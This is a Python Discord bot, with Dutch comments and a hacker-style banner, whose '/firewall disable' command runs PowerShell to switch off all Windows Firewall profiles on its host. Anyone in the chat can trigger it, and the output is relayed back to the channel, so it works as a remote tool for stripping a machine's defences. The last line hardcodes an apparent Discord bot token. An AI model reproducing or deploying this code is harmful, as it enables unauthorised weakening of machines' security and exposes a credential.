import subprocess
import discord
from discord.ext import commands

# Banner
banner = r"""  
___   ___   _________  ______     ___   ___   ________   ______    ______    ______   __       ______                                                    
/__/\ /__/\ /________/\/_____/\   /__/\ /__/\ /_______/\ /_____/\  /_____/\  /_____/\ /_/\     /_____/\                                                    
\::\ \\  \ \\__.::.__\/\:::_ \ \  \::\ \\  \ \\::: _  \ \\:::_ \ \ \:::_ \ \ \:::_ \ \\:\ \    \:::_ \ \                                                
 \::\/_\ .\ \  \::\ \   \:(_) \ \  \::\/_\ .\ \\::(_)  \ \\:(_) ) )_\:(_) ) )_\:\ \ \ \\:\ \    \:\ \ \ \                                                
  \:: ___::\ \  \::\ \   \: ___\/   \:: ___::\ \\:: __  \ \\: __ `\ \\: __ `\ \\:\ \ \ \\:\ \____\:\ \ \ \                                                
   \: \ \\::\ \  \::\ \   \ \ \      \: \ \\::\ \\:.\ \  \ \\ \ `\ \ \\ \ `\ \ \\:\_\ \ \\:\/___/\\:\/.:| |                                                
    \__\/ \::\/   \__\/    \_\/       \__\/ \::\/ \__\/\__\/ \_\/ \_\/ \_\/ \_\/ \_____\/ \_____\/ \____/_/                                                
"""

# Definieer intents
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='/', intents=intents)
bot.remove_command('help')  # Verwijdert het standaard help-command

@bot.command(name='firewall')
async def firewall(ctx, action: str):
    """ Beheer de Windows Firewall via een Discord bot. Gebruik: /firewall disable """
    await ctx.send(f"```\n{banner}\n```")  # Print de banner
    
    # PowerShell-commando's voor firewallbeheer
    powershell_commands = {
        "disable": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
    }

    if action.lower() not in powershell_commands:
        await ctx.send("Ongeldige actie! Gebruik: `/firewall disable`")
        return

    command = f"powershell -Command \"{powershell_commands[action.lower()]}\""

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode == 0:
            await ctx.send(f"Succesvol uitgevoerd:\n```\n{result.stdout}\n```")
        else:
            await ctx.send(f"Fout bij uitvoeren van het commando:\n```\n{result.stderr}\n```")
    except Exception as e:
        await ctx.send(f"Er is een fout opgetreden:\n```\n{e}\n```")

@bot.command(name='help')
async def help_command(ctx):
    """ Toont het help-menu met beschikbare commando's. """
    help_text = """
    Beschikbare commando's:
    /help      - Toon dit help-menu.
    /firewall   - Beheer de firewall. Gebruik: `/firewall disable`
    """
    await ctx.send(f"```\n{banner}\n{help_text}\n```")

# Start de bot
bot.run("MTM0MzU5OTExMDI0NjM2NzMwNQ.GpkKGO.FGxDjn02r8zWg4rc4Ks_Uw_IrrxVq1ZagKo7uI")
